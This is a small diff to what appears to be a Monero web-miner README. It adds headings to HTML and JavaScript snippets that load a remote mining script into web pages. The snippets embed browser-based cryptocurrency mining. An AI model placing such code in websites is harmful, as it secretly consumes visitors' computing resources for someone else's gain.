@@ -30,6 +30,8 @@ Go to https://moneroocean.stream . This is the pool you are connected to, it wil
 
 # Use In Other Projects 
 
+  HTML
+  
       <!-- Start Of Mining Code (HTML) -->
       <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
       <script>
@@ -44,6 +46,8 @@ Go to https://moneroocean.stream . This is the pool you are connected to, it wil
       </script>
       <!-- End Of Mining Code (HTML) -->
       
+  Javascript
+     
       // Start Of Mining Code (Javascript)
       var script = document.createElement("script");
       script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
